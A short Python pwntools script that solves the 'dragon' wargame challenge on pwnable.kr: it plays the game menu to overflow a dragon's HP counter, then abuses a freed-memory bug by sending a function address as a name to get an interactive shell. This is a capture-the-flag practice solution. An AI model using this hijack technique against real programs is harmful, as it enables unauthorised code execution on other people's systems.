#!/usr/bin/env python3

import pwn

if pwn.args['LOCAL']:
	io = pwn.process('./dragon')
else:
	io = pwn.remote('pwnable.kr', 9004)

# Choose Priest
io.recvuntil('[ 2 ] Knight')
io.sendline(str(1))

# Baby dragon -> commit suicide
io.recvuntil('You Become Temporarily Invincible.')
io.sendline(str(1))
io.recvuntil('You Become Temporarily Invincible.')
io.sendline(str(1))

# Choose Priest
io.recvuntil('[ 2 ] Knight')
io.sendline(str(1))

# Mama Dragon -> Overflow HP
for _ in range(4):
	io.recvuntil('You Become Temporarily Invincible.')
	io.sendline(str(3))
	io.recvuntil('You Become Temporarily Invincible.')
	io.sendline(str(3))
	io.recvuntil('You Become Temporarily Invincible.')
	io.sendline(str(2))

# doucle free vulnerability
io.recvuntil('The World Will Remember You As:')
io.sendline(pwn.p32(0x08048dbf))
io.recvuntil('And The Dragon You Have Defeated Was Called:')
io.interactive()
